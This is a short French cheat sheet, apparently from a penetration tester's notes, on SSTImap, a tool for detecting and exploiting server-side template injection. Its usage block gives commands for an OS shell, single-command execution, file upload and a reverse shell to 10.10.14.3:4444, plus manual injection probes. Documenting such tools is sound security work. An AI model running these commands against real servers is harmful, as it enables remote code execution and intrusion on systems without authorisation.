---
titre: "SSTImap"
tags: [Outils, Web, SSTI, RCE, scanner]
source: https://github.com/vladko312/SSTImap
---

# SSTImap

**Détection + exploitation de Server-Side Template Injection (SSTI)** et de
*code injection*. Successeur de Tplmap. Va jusqu'à l'**accès à l'OS** (RCE) quand
le moteur de template le permet.

> ⚠️ Exploitation (RCE) uniquement sur cible autorisée. Cf. `README`.

## Moteurs supportés (extrait)
- **Python** : Jinja2, Mako, Tornado, Cheetah
- **PHP** : Twig, Smarty
- **Java** : Freemarker, Velocity, OGNL, SpEL
- **JS** : Nunjucks, EJS, Pug, doT, Marko
- **Ruby** : ERB, Slim · + SSI, Dust.js, et injections `eval()` (Java/JS/PHP/Python/Ruby)

## Téléchargement / installation
```bash
git clone https://github.com/vladko312/SSTImap.git
cd SSTImap
pip install -r requirements.txt
```

## Utilisation
```bash
# détection auto (point d'injection + moteur)
./sstimap.py -u "https://cible/page?name=John"
./sstimap.py -u "https://cible/page" -d "name=John"      # POST

# exploitation
./sstimap.py -u "https://cible/page?name=John" --os-shell        # shell OS
./sstimap.py -u "https://cible/page?name=John" --os-cmd "id"     # commande unique
./sstimap.py -u ... --eval-shell      # shell dans le langage du moteur
./sstimap.py -u ... --reverse-shell 10.10.14.3 4444
./sstimap.py -u ... --upload local remote   # (et --download)
./sstimap.py -i -u ...                # mode interactif
```

## Réflexe
Repérer d'abord manuellement (`{{7*7}}` → `49`, `${7*7}`, `#{7*7}`) pour
identifier le moteur, puis laisser SSTImap confirmer et exploiter. Utile pour le
module [[Command Injection - Index]] côté template.
